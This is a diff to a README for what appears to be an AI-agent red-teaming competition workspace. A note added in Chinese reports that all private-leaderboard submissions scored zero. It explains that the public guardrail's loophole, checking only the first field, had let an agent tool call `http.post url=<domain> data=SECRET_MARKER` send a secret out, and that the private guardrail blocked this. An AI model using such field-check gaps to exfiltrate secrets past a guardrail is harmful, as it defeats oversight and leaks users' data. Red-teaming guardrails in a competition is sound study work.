@@ -1,5 +1,13 @@
 # AI Agent Attack Workspace
 
+> **最终结果（2026-09）**：比赛已结束，private leaderboard 上所有提交均为 **0 分**。
+> 这是结构性结果而非工程失误：private guardrail `persistent_provenance_private`
+> 关闭了 public guardrail 的唯一高产入口（`http.post url=<domain> data=SECRET_MARKER`
+> 靠"只查第一个字段"的漏洞放行）。private 版改为全字段溯源核查 `data`，命中
+> "secret" → `Decision.deny` → 每个 candidate 都是 0 → 总 0。详见
+> `submission/archive/leaderboard_history.md` 与 `explore/` 中的 SDK 分析。
+> 仓库保留从 V7 到 V170 的全部实验版本作为方法论记录。
+
 This workspace is organized around two active workflows:
 
 - `submission/current/`: numbered Kaggle submission candidates and handoff notes.
